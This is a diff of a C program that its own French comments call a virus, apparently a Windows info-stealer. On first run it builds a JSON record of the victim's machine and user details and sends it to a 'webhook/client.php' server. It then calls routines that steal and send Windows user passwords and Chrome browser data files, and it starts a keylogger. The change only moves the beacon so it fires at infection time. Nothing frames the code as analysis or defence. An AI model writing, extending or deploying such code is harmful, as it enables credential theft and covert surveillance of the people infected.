@@ -58,12 +58,16 @@ int main(void)
         // Enregistrer l'uid dans dans le repertoire du virus un fichier
         save_uid(uid);
 
+        char client_data[1000];
+        snprintf(client_data, 1000, "{\"uid\":\"%s\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name, computer.username, computer.windows_version, computer.architecture);
+        send_to_server("webhook/client.php", client_data);
+
         save_and_send_windows_users_password(&computer);
         send_chrome_data_files(&computer);
     }
     else
     {
-        // on recupere l'uid qui est censé exister et ont le met dans uid
+
         get_uid(uid);
     }
 
@@ -72,11 +76,6 @@ int main(void)
     printf("Windows Version: %s\n", computer.windows_version);
     printf("Architecture: %s\n\n", computer.architecture);
     printf("UID: %s\n\n", uid);
-
-    char client_data[1000];
-
-    snprintf(client_data, 1000, "{\"uid\":\"%s\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name, computer.username, computer.windows_version, computer.architecture);
-    send_to_server("webhook/client.php", client_data);
 
     start_keylogger();
 
